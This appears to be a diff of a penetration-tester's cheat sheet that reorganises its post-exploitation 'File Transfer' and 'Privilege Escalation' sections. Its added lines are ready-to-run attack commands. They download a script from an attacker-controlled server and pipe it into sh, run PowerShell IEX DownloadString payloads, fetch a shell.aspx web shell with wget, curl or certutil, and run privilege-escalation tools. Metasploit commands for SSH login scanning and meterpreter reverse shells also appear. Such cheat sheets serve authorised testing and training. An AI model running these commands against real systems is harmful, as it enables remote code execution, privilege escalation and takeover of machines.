@@ -116,13 +116,6 @@ sort -u passwords | tee passwords
 tar -xzvf backup.tar.gz -C .
 unzip backup.zip -d .
 
-## File Transfer
-powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
-set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
-wget http://$MYIP:8888/shell.aspx -o shell.aspx
-curl http://$MYIP:8888/shell.aspx -o shell.aspx
-certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
-
 ## Web
 [*] Curl
 cat urls | jq -r 'fromjson | .data-block[] | [.id, .clientName, .identityServerUrl, .url] | @csv'
@@ -676,17 +669,15 @@ evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
 evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'
 
 # Post-Exploitation 
-## Fileserver
-mkdir -p ~/Upload/linux; mkdir -p ~/Upload/windows
-python3 -m http.server 8888 -d ~/Upload
-
 ## Linux
-[*] Privilege Escalation
-wget -qO- http://$MYIP:8888/linux/linpeas.sh | bash
-curl http://$MYIP:8888/linux/linpeas.sh | bash
+[*] File Transfer
+wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
+curl http://$MYIP:8888/linux/linpeas.sh | sh
 c=./GTFONow.py;curl $MYIP:8888/linux/$c -O;chmod +x $c;python3 $c -a
 c=./traitor;curl $MYIP:8888/linux/$c -O;chmod +x $c;$c -a
+scp -r ~/Upload $USERNAME@$TARGET:~
 
+[*] Privilege Escalation
 find / -perm /4000 2>/dev/null | xargs ls -la
 sudo -l
 netstat -tuln
@@ -715,9 +706,6 @@ msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg
 
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run;'
 
-[*] File Transfer
-scp -r ~/Upload $USERNAME@$TARGET:~
-
 [*] Upgrade TTY
 python3 -c 'import pty; pty.spawn("/bin/bash")';
 CTRL-Z
@@ -728,6 +716,13 @@ stty rows <num> columns <num>
 reset
 
 ## Windows
+[*] File Transfer
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
+set cmd powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1');"
+wget http://$MYIP:8888/shell.aspx -o shell.aspx
+curl http://$MYIP:8888/shell.aspx -o shell.aspx
+certutil -urlcache -f http://$MYIP:8888/shell.aspx shell.aspx
+
 [*] Privilege Escalation
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
